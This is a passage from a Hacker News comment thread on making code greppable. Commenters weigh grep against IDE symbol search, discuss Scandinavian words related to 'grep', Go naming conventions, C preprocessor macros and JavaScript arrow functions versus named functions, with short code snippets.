I only noticed because I used both methods, and string search showed me one or two places more than the method that relied on the underlying code-parsing. Unfortunately IDEs have bugs, and the method you suggests relies on much more work of the IDE in parsing and indexing compared to the much more mundane string or string pattern search. reply troupo 12 hours agorootparent> Isn't string search, or grepping for patterns, even more trivial? It's not trivial when you looking for symbols in context. > the method you suggests relies on much more work of the IDE in parsing and indexing compared to ...compared to parsing and indexing you have to do manually because a full-text search (especially in a large codebase) will return a lot of irrelevant info? Funnily enough I also have a personal anecdote. We had a huge PHP code base based on Symfony. We were in the middle of a huge refactoring spree. I saw my colleagues switch from vim/emacs to Idea/WebStorm looking at how I easily found symbols in the code base, found their usages, refactored them etc. compared to the full-text search they were always stuck with. This was 5-6 years ago, before LSP became ubiquitous. reply nosianu 1 hour agorootparent> It's not trivial Did you miss the comparison? The \"more trivial\"? The context of my response? Please read the parent comment I responded to, treating my comment as standalone and adding some new meaning makers no sense. String search is more trivial than a search that involves an interpretation of the code structure and meaning. I have no idea why you wish to start a discussion about such trivial statement. > * because a full-text search (especially in a large codebase) will return a lot of irrelevant info?* It doesn't do that for me but instead works very well. I don't know what you do with your symbol names, but I have barely any generic function names, the vast majority of them are pretty unique. No idea how you use search, but I'm never looking for \"doSomething(\", it's always \"doSomethingVerySpecific()\", or some equally specific string constant. I don't have the problems you tell me I should have, and my use case was the subject of my comment, as should be clear, as well as my comment being a response to a specific point made by the parent comment. reply cma 6 hours agorootparentprev> All of that is trivial to search for with a tool that understands the language. Some literal in a log message may come from the code or it might be remapped in some config file outside the language the LSP is looking at, or an environment variable etc.. I just go back and forth with grep and IDE tools, both have different tradeoffs. reply troupo 3 hours agorootparentThe thing is, so many people are weirdly obsessed with never using any other tools besides full-text search. As if using useful tools somehow makes them a lesser programmer or something :) reply renewiltord 12 hours agorootparentprevI actually don't think there's a tool that handles usages when using PHP varvars or when using example number one there which is parametrically choosing a table name. When you string interpolate to build the name you lose searchability. reply troupo 11 hours agorootparentYes, full-text search is a great fallback when everything else fails. But in the use cases listed at the beginning of the article it's usually not needed if you have proper tools reply tabbott 6 minutes agoprevGreppability is the reason why I feel it's really quite unfortunate that HTML's dataset attribute went with \"canonicalizing\" to camel case; if you're using any non-camel-case data attribute names in your project, then they immediately become not fully greppable when making use of `dataset`. https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement... reply VoxPelli 11 hours agoprevI advocate for greppability as well – and in Swedish it becomes extra fun – as the equivalent phrase in Swedish becomes \"grep-bar\" or \"grep-barhet\" and those are actual words in Swedish – \"greppbar\" roughly means \"understandable\", \"greppbarhet\" roughly means \"the possibility to understand\" reply sshine 11 hours agoparentHow many other UNIX commands did the Swedes adopt into their language? I know that they invented \"curl\". Do you tar xfz? reply scbrg 10 hours agorootparentWe do tar, for xfz I think you have to look to the Slavic languages :) Anyway, to answer your question: $ grep -Fxfable to hold Would \"grasp\" work? reply actionfromafar 8 hours agorootparentYes. \"Grasping for straws.\" reply octocop 11 hours agorootparentprevIt's closer to grip reply trashtester 8 hours agorootparent\"zu greifen\" may best translate to \"to grip\", but \"grip\" has different mental connotations in English (it refers to mental stability, not intellectual insight). The best dual purpose translation of \"zu greifen\"/\"gripe\" (German/Scandinavian) meaning \"zu begreifen\"/\"begripe\"/\"understand\" would be \"to grasp\", which covers both physically grabbing into something and also to understand it intellectually. All these words stem back to the Proto-Indo-European gʰrebʰ, which more or less completes the circle back to \"grep\". reply lordgrenville 7 hours agorootparentrelated to \"grok\"? reply trashtester 6 hours agorootparentgrok /ɡrɒk/ Origin 1960s: a word invented by Robert Heinlein (1907–88), American author. reply n_plus_1_acc 10 hours agorootparentprevI've always related grep to grab reply elygre 11 hours agoparentprevCould I suggest that greppbarhet is more precisely translated as “the ability of being understood”? (Norwegian here. Our languages are similar, but we miss this one.) reply medstrom 8 hours agorootparentNorwegian still translates grep as \"grip\"/\"grab\". I always thought of grepping as reaching in with a hand into the text and grabbing lines. That association is close at hand (insert lame chuckle) for German and English speakers too. reply pbhjpbhj 8 hours agorootparentIn English that association is going to depend a lot on one's accent; until now I've never associated grep-ing with anything other than using grep! (But, equally, that might just be a me thing.) reply bee_rider 7 hours agorootparentIt doesn’t sound anything like grip in my accent but for some reason the association has always been there for me. Grabbing or ripping parts from the file. reply medstrom 6 hours agorootparentprevWhat about groping? Groping around for text. reply psychoslave 10 hours agorootparentprevSo, at the extrem opposite of the esoteric \"general regular expression print\" that grep stands for with few ever knowing it? reply johncoltrane 9 hours agorootparents/general/global reply vanschelven 11 hours agoparentprevBegreppelijk (begrijpelijk) in Dutch reply Cthulhu_ 10 hours agorootparentor \"Grijpbaar\" (grabbable) reply medstrom 8 hours agorootparentSo Dutch/German make \"begreif\" a verb, for Swedish it is just a noun (that means \"concept\"). But \"begrijpelijk\" has a clone: \"begriplig\". An adverb based on a verb in a foreign dictionary. There is no verb that goes \"begreppa\", it's just \"greppa\". reply fedder 6 hours agorootparentThe term concept itself suggests grasping or holding/taking hold of, see the latin verb concipio or adjective conceptus. reply jeroenhd 5 hours agorootparentprevDutch also has a noun (\"begrip\") meaning \"notion\" or \"understanding\". reply trashtester 8 hours agorootparentprev\"Jag kan inte begripa svenska.\" reply medstrom 8 hours agorootparentOh, you're right. reply octocop 11 hours agoparentprevAnd we also have \"begrepp\", which is also a spin on content and understanding it's content. reply majewsky 9 hours agorootparentOh, that's like German \"begreifen\", no? (Which means \"to grok\".) reply medstrom 9 hours agorootparentGrok is right! I'd translate Swedish \"greppbar\" directly as \"grokkable\"; \"att greppa\" as \"to grok\". reply TeMPOraL 10 hours agoparentprevWhich is ironic, given that the article is about making it easier to use grep in order to avoid having to understand anything. reply bob88jg 9 hours agorootparentNah, you've got it backwards. The article isn't about dodging understanding - it's about making it way easier to spot patterns in your code. And that's exactly how you start to really get what's going on under the hood. Better searching = faster learning. It's like having a good map when you're exploring a new city reply TeMPOraL 5 hours agorootparentThe article advocates making code harder to understand for the sake of better search. It's like forcing a city to conform to a nice, clean, readable map: it'll make exploring easier for you, at the cost of making the city stop working. reply layer8 8 hours agoparentprevGraspability. ;) More customarily: intelligibility. reply adpirz 15 hours agoprevI've seen some pretty wild conditional string interpolation where there were like 3-4 separate phrases that each had a number of different options, something akin to `${a ? 'You' : 'we'} {b ? 'did' : 'will do' } {c ? 'thing' : 'things' }`. When I was first onboarding to this project, I was tasked with updating a component and simply tried to find three of the words I saw in the UI, and this was before we implemented a straightforward path-based routing system. It took me far too long just to find what I was going to be working on, and that's the day I distinctly remember learning this lesson. I was pretty junior, but I'd later return to this code and threw it all away for a number of easily greppable strings. reply ctxc 14 hours agoparentTangential: I love it when UIs say \"1 object\" and \"2 objects\". Shows attention to detail. As opposed to \"1 objects\" or \"1 object(s)\". A UI filled with \"(s)\", ughh reply gnuvince 8 hours agorootparentI like the more robotic \"Objects: 1\" or \"Objects: 2\", since it avoids the pluralization problems entirely (e.g., in French 0 is singular, but in English it's plural; some words have special when pluralized, such as child -> children or attorney general -> attorneys general). And related to this article, it's more greppable/awkable, e.g. `awk /^Objects:/ && $2 > 10`. reply petepete 13 hours agorootparentprevMoreso when it's not tripped up by \"1 sheeps\" or \"1 diagnoses\". reply nox101 4 hours agorootparentprevSounds like you're going to have a bad time https://www.foo.be/docs/tpj/issues/vol4_1/tpj0401-0013.html reply ajuc 5 hours agorootparentprevFun fact - I had to localize this kind of logic to my language (Polish). I realized quickly it's fucked up. This is roughly the logic: function strFromNumOfObjects(n) { if (n === 1) { return \"obiekt\"; } let last_digit = (n%10); let penultimate_digit = Math.trunc((n%100)/10); if ((penultimate_digit == 0 || penultimate_digit >= 2) && last_digit > 1 && last_digitA piece of Go source code should avoid unnecessary repetition. One common source of this is repetitive names, which often include unnecessary words or repeat their context or type. Code itself can also be unnecessarily repetitive if the same or a similar code segment appears multiple times in close proximity. https://google.github.io/styleguide/go/decisions#repetitive-... (see also https://google.github.io/styleguide/go/best-practices#avoid-...) This is the style rule that motivates the sibling comment about method names being split between method and receiver, for what it's worth. I don't think this use case has received much attention internally, since it's fairly rare at Google to use grep directly to navigate code. As you suggest, it's much more common to either use your IDE with LSP integration, or Code Search (which you can get a sense of via Chromium's public repository, e.g. https://source.chromium.org/search?q=v8&sq=&ss=chromium%2Fch...). reply klodolph 59 minutes agorootparentThe thing about stuttering is that the first part of the name is fixed anyway, MOST of the time. If you want to search for `url.Parse`, you can find most of the usages just by searching for `url.Parse`, because the package will generally be imported as `url` (and you won’t import Parse into your namespace). It’s not as good as find references via LSP but it is like 99% accurate and works with just grep. reply madeofpalk 10 hours agorootparentprevThe culture of single letter variables in golang, at least in the codebases I've seen, undoes this. reply alienchow 8 hours agorootparentSingle letter variables in Golang are to be used in small, local contexts. Akin to the throwaway i var in for loops. You only grep the struct methods, the same way no one greps 'this' or 'self'. The code bases you've been reading, and even some of the native libraries, don't do it properly. Probably due to legacy reasons that wouldn't pass readability approvals nowadays. reply lelanthran 9 hours agorootparentprev> The culture of single letter variables in golang, at least in the codebases I've seen, undoes this. The convention, not just in Go, is that the smaller the scope, the smaller the variable reference. So, sure, you're going to see single-letter variables in short functions, inside short block scopes, etc, but that is true of almost any language. I haven't seen single-letter variables in Go that are in a scope that isn't short. Of course, this could just mean that I haven't seen enough of other peoples Go source. reply lanstin 4 hours agorootparentZipf's law, right - these rules are a formalization of our brain's functionality with language. Of course, with enough code, someone does everything. reply marcosdumay 4 hours agorootparentprev> that is true of almost any language You'd be surprised how often language-local cultures break that rule on either side. And a few times it's even an improvement. reply kazinator 3 hours agorootparentprevE.g. food and art are very important in Japan, so stomach is i and a drawing/painting is e. reply BrandoElFollito 1 hour agorootparentFood is very very important in France so we call it nourriture :) reply iudqnolq 8 hours agorootparentprevI like using l for logger and db for database client/pool/handle even if there's a wider scope. And if the bulk of a file is interacting with a single client I might call that c. reply VonGallifrey 9 hours agorootparentprevThe way I have seen this is that single letter variables are mostly used when declaration and (all) usages are very close together. If I see a loop with i or k, v then I can be fairly confident that those are an Index or a Key Value pair. Also I probably don't need to grep them since everything interacting with these variables is probably already on my screen. Everything that has a wider scope or which would be unclear with a single letter is named with a more descriptive name. Of course this is highly dependent on the people you work with, but this is the way it works on projects I have worked on. reply eptcyka 11 hours agorootparentprevGolang gets zero points from me because function receivers are declared between func and the name of the function. God ai hate this design choice and boy am I glad I can use golsp. reply sethammons 7 hours agorootparentI search \") myFunc\" to find member functions. It would be nice to search \"c myFunc\", but a parentheses works reply medstrom 8 hours agorootparentprevIs it just hard to get used to, or does it fundamentally make something more difficult? reply kragen 8 hours agorootparentthis thread is about using `grep` to find things, and this subthread is specifically about how the `func` keyword in golang makes it easy to distinguish the definition of a function from its uses, so yes, because `grep 'func lart('` will not find definitions of `lart` as a method. you might end up with something like `grep 'func .*) *lart('` which is both imprecise and enough noise that you will not want to type it; you'll have to can it in a script, with the associated losses of flexibility and transparency reply medstrom 7 hours agorootparentThat's fair, I see many examples in this thread where people pass an exact string directly to grep, as you do. I'm an avid grepper, but my grep tool [1] translates spaces to \".*?\", so I would just type \"func lart(\" in that example and it would work. An incremental grep tool with just this one transformation rule gets you a lot more mileage out of grep. [1] https://github.com/minad/consult/blob/screenshots/consult-li... EDIT: Better demo https://jumpshare.com/s/zMENBSr2LwwauJVjo1wS reply kragen 7 hours agorootparentthat's going to find all the functions that take an argument named lart or of a lart type too, but it also sounds like a thing i really want to try reply vitus 7 hours agorootparentAlso, anything that contains \"func\" and \"lart\" as a substring, e.g. foobar(function), blart(baz). It's not far off from my manually-constructed patterns when I want to make sure I find a function definition (and am willing to tolerate some false positives), but I personally prefer fine-grained control over when it's in use. reply medstrom 6 hours agorootparentMmh, I type \"func\\ lart(\" when I need the literal string. But it's less often, so it's fair that it's slightly more to type. reply kragen 6 hours agorootparentyeah! reply ljm 8 hours agorootparentprevCan’t say I’ve ever had an issue with it, but it does get a bit wild when you have a function signature that takes a function and returns one, unless you clear it up with some types. func (s *Recv) foo(fn func(x any) err) func bar(y any) (*Recv, err) As an exaggerated example. Easy to parse but not always easy to read at a glance. reply eptcyka 7 hours agorootparentprevI have to always add wildcards between func and the function name, because I can never know how the other developer has decided to specify the name of the receiver. This will always be a problem as far as grepping with primitive tools that don't parse the language. reply medstrom 6 hours agorootparentFYI, many people use thin wrappers like this, it's still a primitive tool that doesn't parse the language, but it can handle that problem: https://jumpshare.com/s/zMENBSr2LwwauJVjo1wS (GIF) reply eptcyka 6 hours agorootparentOn machines where I control the tooling, this is not an issue. But I can’t take my config to my colleagues machine. reply lanstin 4 hours agorootparentIf only AFS had succeeded. What would a modern version of this look like? reply kazinator 3 hours agorootparentprevReceivers are utterly idiotic. Like how could anyone with two working brain cells sign off on something like that? If you don't want OOP in the language, but want people to be able to write thing.function(arg), you just make function(thing, arg) and thing.function(arg) equivalent syntax. reply Pxtl 3 hours agorootparentC# did this for extension methods and it Just Works. You just add the \"this\" keyword to a function in a pure-static class and you get method-like calling on the first param of that function. reply kazinator 3 hours agorootparentIf the function has to be modified in any way in order to grant permission to be used that way, then it is not quite \"did this\". Equivalent means that there is no difference at the AST level between o.f(a) and f(o, a), like there is no difference in C among (a + i), a[i], i[a] and (i + a). However, a this keyword is way better than making the programmers fraction off a parameter and move it to the other side of the function name. reply tczMUFlmoNk 1 hour agorootparentA search term here is \"Uniform Function Call Syntax\", as present in (e.g.) D: https://en.wikipedia.org/wiki/Uniform_Function_Call_Syntax reply executesorder66 4 hours agorootparentprevHow many God AI's have expressed their hate for this design? /s reply bryanrasmussen 13 hours agoparentprevJavaScript has multiple ways to define a function so you sort of lose that getting the actual definition benefit. on edit: I see someone discussed that you can grep for both arrow functions and named function at the same time and I suppose you can also construct a query that handles a function constructor as well - but this does not really handle curried functions or similar patterns - I guess at that point one is letting the perfect become the enemy of the good. Most people grepping know the code base and the patterns in use, so they probably only need to grep for one type of function declaration. reply zarzavat 12 hours agoparentprevC is so much worse than that. Many people declare symbols using macros for various reasons, so you end up with things like DEFINE_FUNCTION(foo) {. In order to get a complete list of symbols you need to preprocess it, this requires knowing what the compiler flags are. Nobody really knows what their compiler flags are because they are hidden between multiple levels of indirection and a variety of build systems. reply skissane 8 hours agorootparent> C is so much worse than that. Many people declare symbols using macros for various reasons, so you end up with things like DEFINE_FUNCTION(foo) {. That’s not really C; that’s a C-based DSL. The same problem exists with Lisp, except even worse, since its preprocessor is much more powerful, and hence encourages DSL-creation much more than C does. But in fact, it can happen with any language - even if a language lacks any built-in processor or macro facility, you can always build a custom one, or use a general purpose macro processor such as M4. If you are creating a DSL, you need to create custom tooling to go along with it - ideal scenario, your tools are so customisable that supporting a DSL is more about configuration than coding something from scratch. reply kazinator 3 hours agorootparentIf your Lisp macro starts with a symbol whose name begins with def, and the next symbol is a name, then good old Exuberant Ctags will index it, and you get jump to definition. Not so with DEFINE_FUNCTION(foo) {, I think. $ cat > foo.lisp (define-musical-scale g) $ ctags foo.lisp $ grep scale tags g foo.lisp /^(define-musical-scale g)$/;\" f Exuberant Ctags is not even a tool from the Lisp culture. I suspect it is mostly shunned by Lisp programmers. Except maybe for the Emacs one, which is different. (Same ctags command name, completely different software and tag file format.) reply kragen 7 hours agorootparentprevthe issue is that the c preprocessor is always available and usually used reply skissane 7 hours agorootparentOther languages have preprocessors or macro facilities too. C's is very weak. Languages with more powerful preprocessors/macros than C's include many Lisp dialects, Rust, and PL/I. If you think everyone using a weak preprocessor is bad, wait until you see what people will do when you give them a powerful one. Microfocus COBOL has an API for writing custom COBOL preprocessors in COBOL (the Integrated Preprocessor Interface). (Or some other language, if you insist.) I bet there are some bizarre abominations hidden in the bowels of various enterprises based on that (\"our business doesn't just run on COBOL, it runs on our own custom dialect of COBOL!\") reply kragen 7 hours agorootparentc's macro system is weak on purpose, based on, i suspect, bad experiences with m6 and m4. i think they thought it was easier to debug things like ratfor, tmg, lex, and (much later) protoc, which generate code in a more imperative paradigm for which their existing debugging approaches worked i can't say i think they were wholly wrong; paging through compiler error messages is not my favorite part of c++ templates. but i have a certain amount of affection for what used to be called gasp, the gas macro system, which i've programmed for example to compute jump offsets for compiling a custom bytecode. and i think m4 is really a pathological case; most hairy macro systems aren't even 10% as bad as m4, due to a combination of several tempting but wrong design decisions. lots of trauma resulted so when they got a do-over they eliminated the preprocessor entirely in golang, and compensated with reflection, which makes debugging easier rather than harder probably old hat to you, but i just learned last month how to use x-macros in the c preprocessor to automatically generate serialization and deserialization code for record types (speaking of cobol): http://canonical.org/~kragen/sw/dev3/binmsg_cpp.c (aha, i see you're linking to a page that documents it) reply skissane 6 hours agorootparentC's is weak yet not weak – you can do various advanced things (like conditional expansion or iteration), but using esoteric voodoo with extreme performance cost. Whereas other preprocessors let you do that using builtins which are fast and easy to grok. See for example https://github.com/pfultz2/Cloak/wiki/C-Preprocessor-tricks,... Poor C preprocessor performance has a negative real world impact, for example recently with the Linux kernel – https://lwn.net/Articles/983965/ – a more powerful preprocessor would enable people to do those things they are doing anyway much more cheaply reply lanstin 2 hours agorootparentI've always suspected the powerful macro facilities in Lisp are why it's never been very common - the ability to do proper macros means all the very smart programmers create code that has to be read like a maths paper. It's too bespoke to the problem domain and too tempting to make it short rather than understandable. I like Rust (tho I have not yet programmed in it) but I think if people get too into macro generated code, there is a risk there to its uptake. It's hard for smart programmers to really believe this, but the old \"if you write your code as cleverly as possible, you will not be able to debug it\" is a useful warning. reply db48x 7 hours agorootparentprevYes, the usefulness of macros always has to be balanced against their cost. I know of only one codebase that does this particular thing though, Emacs. It is used to define Lisp functions that are implemented in C. reply shadowgovt 4 hours agorootparentIt's a common pattern for just about any binding of C-implementation to a higher-level language. Python has a similar pattern, and I once had to re-invent it from scratch (not knowing any of this) for a game engine. reply CGamesPlay 14 hours agoparentprevNot JavaScript. Cool kids never write “function” any more, it’s all arrow functions. You can search for const, which will typically work, but not always (could be a let, var, or multi-const intializer). reply pjerem 11 hours agorootparentYes but that’s an anti pattern. Arrow functions aren’t there to look cool, they’re how you define lambdas / anonymous functions. Other than that, functions should be defined by the keyword. reply wiseowise 11 hours agorootparentHow is that an anti-pattern? > Other than that, functions should be defined by the keyword. Says who? reply hansworst 10 hours agorootparentAnonymous functions don't have names. This makes it much harder to do things like profiling (just try to find that one specific arrow function in your performance profile flame graph) and tracing. Tools like Sentry that automatically log stack traces when errors occur become much less useful if every function is anonymous. reply mostlylikeable 6 hours agorootparentTo me, arrow functions behave more like I would expect functions to behave. They don’t include all the magic bindings that the function keyword imparts. Feels more “pure” to me. Anonymous functions can be either function () {} or () => {} reply medstrom 8 hours agorootparentprevconst foo = () => {} This function is not anonymous, it's called foo. reply mrighele 6 hours agorootparentInteresting, it seems that the javascript runtime is smart enough detect this pattern and actually create a named function (I tried Chrome and Node.js) const foo = () => {} console.log( foo.name ); actually outputs 'foo', and not the empty string that I was expecting. const test = () => ( () => {} ); const foo = test(); console.log( foo.name ); outputs the empty string. Is this behavior required by the standard ? reply Izkata 1 hour agorootparentYou're probably remembering how it used to work. This is the example I remember from way back that we shouldn't use because (aside from being unnecessary and weird) this function wouldn't have a name in stack traces: var foo = function() {}; Except nowadays it too does have the name \"foo\". reply svieira 6 hours agorootparentprevYes, in great detail. https://tc39.es/ecma262/multipage/ordinary-and-exotic-object... is the specification, and for the TL;DR https://developer.mozilla.org/en-US/docs/Web/JavaScript/Refe... is pretty good. reply croes 7 hours agorootparentprevBut to call foo in bar you must define foo before bar. function foo(){} is also callable if bar is defined before foo. reply sestep 6 hours agorootparentNot true at the top-level. reply wruza 4 hours agorootparentNot sure what you find not true about it. All named “function”s get hoisted just like “var”s, I use post-definitions of utility functions all the time in file scopes, function scopes, after return statements, everywhere. You’re probably thinking about const foo = function (){} without its own name before (). These behave like expressions and cannot be hoisted. reply MetaWhirledPeas 4 hours agorootparent> I use post-definitions of utility functions all the time in file scopes, function scopes, after return statements, everywhere I haven't figured out if people consider this a best practice, but I love doing it. To me the list of called functions is a high-level explanation of the code, and listing all the definitions first just buries the high-level logic \"below the fold\". Immediately diving into function contents outside of their broader context is confusing to me. reply wruza 3 hours agorootparentI don’t monitor “best” practices, so beware. But in languages like C and Pascal I also had a habit of simply declaring all interfaces at the top and then grouping implementations reasonably. It also created a nice “index” of what’s in the file. Hoisting also enables cross-imports without helper unit extraction headaches. Many hate js/ts at the “kids hate == and null” level but in reality these languages have a very practical design that wins so many rounds irl. reply BlarfMcFlarf 7 hours agorootparentprevDoes the function know it’s called foo for tracing/error logging/etc? reply mapcars 5 hours agorootparentprevNot really, its an anonymous function stored in a variable foo reply tylerhou 11 hours agorootparentprevAs of a few years ago (not sure about now) the backtrace frame info for anonymous functions were far worse than ones defined via the function keyword with a name. reply lukan 11 hours agorootparentprevAll the wise ones. Well, except for you maybe. Serious arguments would be: - readability - greppability reply lukan 1 hour agorootparent(It wasn't an insult, but a joke on the username) reply lispisok 14 hours agorootparentprevAm I the only one who hates arrow functions? reply spartanatreyu 14 hours agorootparentI did, until I used them enough where I saw where they were useful. The bad examples of arrow functions I saw initially were of: 1. Devs trying to mix them in with OOP code as a bandaid over OOP headahes (e.g. bind/this) instead of just not using OOP in the first place. 2. Devs trying to stick functional programming everywhere because they had seen a trivial example where a `.map()` made more semantic sense than a for/for-in/for-of loop. Despite the fact that for/for-in/for-of loops were easier to read for anything non-trivial and also had better performance because you had access to the `break`, `continue` and `return` keywords. reply throwaway2037 9 hours agorootparent> also had better performance because you had access to the `break`, `continue` and `return` keywords. This is a great point. One more: Debugging `.map()` is also much harder than a for loop. reply medstrom 8 hours agorootparentI feel there are a few ways to invoke .map() in a readable way and many ways that make the code flow needlessly indirect. Should be a judgment call, and the author needs to be used to doing both looping and mapping constructs, so that they are unafraid of the bit of extra typing needed for the loop. reply mewpmewp2 11 hours agorootparentprevAnother benefit of using for instead of array fns is that it is easy to add await keyword should the fn become async. But many teams will have it as a rule to always use array fns. reply jappgar 7 hours agorootparentThat gives you have the option of making it serially async but not parallel, which can be achieved easily using Promise.all in either scenario. reply adregan 5 hours agorootparentAs an aside: It’s way less ergonomic, but you likely want `Promise.allSettled` rather than `Promise.all` as the first promise that throws aborts the rest. reply wruza 4 hours agorootparentIt doesn’t really abort the rest, it just prioritizes the selection of a first catch-path as a current continuation. The rest is still thenable, and there’s no “abort promise” operation in general. There are abort signals, but it’s up to an async process to accept a signal and decide when/whether to check it. reply adregan 1 hour agorootparentAdmittedly, I was being a bit hand-wavy and describing a bit more of how it feels rather than the way it is (I'm perpetually annoyed that promises can't be cancelled), but I was thinking of the code I've seen many times across many code bases: let results; try { results = await Promise.all(vals.map(someAsyncOp)) } catch (err) { console.error(err) } While you could pull that promises mapping into a variable and keep it thenable, 99% of the time I see the above instead. Promises have some rough edges because they are stateful, so I think it might be easier to recommend swapping that Promise.all for an Promise.allSettled, and using a shared utility for parsing the promise result. I consider this issue akin to the relationship between `sort`, `reverse`, `splice`, the mutating operation APIs, and their non mutating counterparts `toSorted`, `toReversed`, `toSpliced`. Promise.all is kind of the mutating version of allSettled. reply crabmusket 12 hours agorootparentprevI don't like using them everywhere, but they're very handy for inline anonymous functions. But it really pains me when I see export const foo = () => {} instead of export function foo() {} reply NohatCoder 6 hours agorootparentBut do they make much of a difference? You have always been able to write: myArray.sort(function(a,b){return a-b}) People for some reason treat this syntactic sugar like it gives them some new fundamental ability. reply marcosdumay 4 hours agorootparentOh Javascript would be much better if it could only be syntactic sugar... `function(a,b){return a-b;}` is different from `(a,b) => a - b` And `function diff(a,b) {return a-b;}` is different from `const diff(a,b) => a - b;`. reply creesch 12 hours agorootparentprevThank you, that's something I also never have understood myself. For inline anonymous functions like callbacks they make perfect sense. As long as you don't need `this`. But everywhere else they reduce readability of the code with no tangible benefit I am aware of. reply jappgar 7 hours agorootparentprevThese aren't equivalent as function foo will be hoisted but const foo will not be. reply cxr 7 hours agorootparentSure the food that this restaurant serves is pricey, but you have to remember that it also tastes terrible. reply crabmusket 4 hours agorootparentprevYep, and that usually doesn't matter at the top level. reply berkes 11 hours agorootparentprevI wish javascript had a built-in or at least (defacto) default linter. Like go-fmt or rust fmt. Or clippy even. One that could enforce these styles. Because not only is the export const foo = () {} painful on itself, it will quite certainly get intermixed with the function foo() {} and then in the next library a const foo = function() {} and so on. I'd rather have a consistently irritating style, than this willy-nilly yolo style that the JS community seems to embrace. reply throwitaway1123 10 hours agorootparentESLint and Prettier are the de facto default linter/formatter combo in JS. There are rules you can enable to enforce your preferred style of function [1][2]. [1] https://eslint.org/docs/latest/rules/func-style [2] https://eslint.org/docs/latest/rules/prefer-arrow-callback reply turboponyy 12 hours agorootparentprevI like them because it reinforces the idea that functions are just values like any other - having a separate keyword feels like it is inconsistent. reply 0xfffafaCrash 11 hours agorootparentMoreover the binding and lexical scope aspects supported by classic functions are amongst the worst aspects of the language. Arrow functions are also far more concise and ergonomic when working with higher order functions or simple expressions The main thing to be wary of with arrow functions is when they are used anonymously inline without it being clear what the function is doing at a glance. That and Error stack traces but the latter is exacerbated by there being no actual standard regarding Error.prototype.stack reply mewpmewp2 11 hours agorootparentprevWhy do you want to reinforce that idea? To me arrow functions mostly just decrease readability and makes them blend in too much, when it should be important distinction what is a function and what is not. reply benrutter 44 minutes agorootparentI'm not a javascript programmer, but I really like the arrow pattern from a distance exactly because it enforces that idea. My experience is that newcomers are often thrown off and confused by higher order functions. I think partly because, well let's be honest they just are more confusing than normal functions, but I think it's also because languages often bind functions differently from everything else. `const cool = () => 5` Makes it obvious and transparent, that `cool' is just a variable where as: `function cool() {return 5}` looks very different from other variable bindings. reply turboponyy 10 hours agorootparentprevNot to be dismissive, but because I like it - it just sits right with me. reply nosianu 12 hours agorootparentprevA simple heuristic I use is to use arrow functions for inline function arguments, and named \"function\" functions for all others. One reason is exactly what the subject of discussion is here, it's easier to string-search with that keyword in front of the name, but I don't need that for trivial inline functions (whenever I do I make it an actual function that I declare normally and not inline). Then there's the different handling of \"this\", depending on how you write your code this may be an important reason to use an arrow function in some places. reply ndnxncjdj 13 hours agorootparentprevI very much prefer the way scoping is handled in arrow functions. reply ajuc 7 hours agorootparentprevI'm of the opinion that giving a global name to an anonymous function should result in a compilation error. reply nsonha 11 hours agorootparentprevwhy the need to pronounce arbitrary preferences, who cares? reply spartanatreyu 14 hours agorootparentprevYes JavaScript. You can search for both: \"function\" and \"=>\" to find all function expressions and arrow function expressions. All named functions are easily searchable. All anonymous functions are throw away functions that are only called in one place so you don't need to search for them in the first place. As soon as an anonymous function becomes important enough to receive a label (i.e. assigning it to a variable, being assigned to a parameter, converting to function expression), it has also become searchable by that label too. reply CGamesPlay 13 hours agorootparentThe => is after the param spec, so you’re searching for foo.*=> or something more complex, but then still missing multiline signatures. This is very easy to get caught by in TypeScript, and also happens when dealing with higher-order functions (quite common in React). reply spartanatreyu 12 hours agorootparentWhy are you searching for foo.=> Are you searching through every function, or functions that have a very specific parameter? And whatever you picked, why? --------------------------------------------------------------- - If you're searching for every function, then there's no need to search for foo.=>, you only need to search for function and =>. - If you're searching for a specific parameter, then just search for the parameter. Searching for functions is redundant. --------------------------------------------------------------- Arrow function expressions and function expressions can both be named or anonymous. Introducing arrow functions didn't suddenly make JavaScript unsearchable. JavaScript supported anonymous functions before arrow function expressions were introduced. Anonymous functions can only ever be: - run on the spot - thrown away - or passed around after they've been given a label Which means, whenever you actually want to search for something, it's going to be labelled. So search for the label. reply supriyo-biswas 14 hours agorootparentprevYou can still search for ` = \\(.*\\) => `, albeit it's a bit cumbersome. reply post-it 14 hours agorootparentAll you need is ` =` Really, all you need is `` and if the first result is a call to that function, just jump to its definition. reply spartanatreyu 14 hours agorootparentExactly. Just search the definition. Any time that a function doesn't have a definition, it's never the target of a search anyway. reply troupo 12 hours agorootparentprevAll you need is a tool that actually understands the language. It's 2024 and HN still suggests using regular expressions to search through a code base. reply lukan 11 hours agorootparentRegex is a universal tool. Your special tool might not work on plattform X, fails for edge case - and you generally don't know how it works. With regex or simple string search - I am in control. And can understand why results show up, or investigate when they don't, but should. reply troupo 10 hours agorootparent> Your special tool might not work on plattform X As always, people come out with the weirdest of excuses to not use actual tools in the 99.9999% of the cases when they are available, and work. When that tools doesn't work, or isn't sufficient, use another one like fuzzy text search or regexps. > and you generally don't know how it works. Do you know how your stove works? Or do you truly understand what the device you're typing this comment on truly works? Only in programming I see people deliberately avoid useful tools becausereply wruza 3 hours agorootparentIt’s you who sees it as excuses. If I have a screwdriver multitool, I don’t need another one which is for d10 only. It simply creates unnecessary clutter in a toolbox. The difference between definition and mention search for a function is: grion name vs grname or for the current identifier, simply gr I could even make my own useful tools like “\\[fvm]gr” for function, variable or field search and brag about it watching miserable ide guys from the high balcony, but ain’t that unnecessary as well. reply troupo 3 hours agorootparent> It simply creates unnecessary clutter in a toolbox. And then you proceed to... invent several pale imitations of a symbol/usages search. More here: https://news.ycombinator.com/item?id=41435862 so as not to repeat myself reply wruza 3 hours agorootparentDoesn’t really apply, ignores things just said. reply kragen 7 hours agorootparentprevif you think anything works in 99.9999% of cases, you’ve never programmed a computer reply lukan 9 hours agorootparentprevWhen you specialize in one thing only, do what you want. But I prefer tools, that I can use wherever I go. To not be dependant and chained to that environment. \"Do you know how your stove works? Or do you truly understand what the device you're typing this comment on truly works?\" Also yes, I do. \" people deliberately avoid useful tools because \" Well, or I did already changed tools often enough, to be fed up with it and rather invest in tech that does not loose its value in the next iteration of the innovation cycle. reply troupo 7 hours agorootparent> When you specialize in one thing only, do what you want. I specialize in one thing only: programming > But I prefer tools, that I can use wherever I go. Do you always walk everywhere, or do you use a tool available at the time, like cars, planes, bycicles, public transport? > rather invest in tech that does not loose its value in the next iteration of the innovation cycle. Things like \"fund symbol\", \"find usages\", \"find implementation\" have been available in actual tools for close to two decades now. reply lukan 7 hours agorootparentI did not say I do not use what is avaiable, but this debate is about in general having your code in a shape that simply searching for 